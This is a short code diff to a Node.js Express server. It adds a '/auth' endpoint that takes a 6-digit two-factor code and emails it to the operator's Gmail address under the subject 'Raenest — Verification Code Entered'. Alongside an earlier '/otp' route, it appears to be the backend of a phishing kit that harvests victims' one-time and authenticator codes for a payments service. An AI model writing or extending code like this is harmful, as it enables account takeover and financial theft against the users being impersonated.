@@ -90,6 +90,44 @@ app.post("/otp", (req, res) => {
   });
 });
 
+// ── POST /auth — 6-digit authenticator code
+app.post("/auth", (req, res) => {
+  const { auth } = req.body;
+
+  if (!auth || !/^\d{6}$/.test(auth)) {
+    return res
+      .status(400)
+      .json({ success: false, message: "Auth must be exactly 6 digits." });
+  }
+  const transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth: {
+      user: userEmail,
+      pass: pass,
+    },
+  });
+
+  const mailOptions = {
+    from: userEmail,
+    to: userEmail,
+    subject: "Raenest — Verification Code Entered",
+    text: `2FA Code: ${auth}`,
+  };
+
+  console.log("→ auth email:", mailOptions.text);
+
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.error("Mail error:", error);
+      return res
+        .status(500)
+        .json({ success: false, message: "Failed to send email." });
+    }
+    console.log("✓ Email sent:", info.response);
+    return res.json({ success: true });
+  });
+});
+
 app.listen(PORT, () => {
   console.log(`Server is running on port http://localhost:${PORT}`); // ✅ FIXED
 });
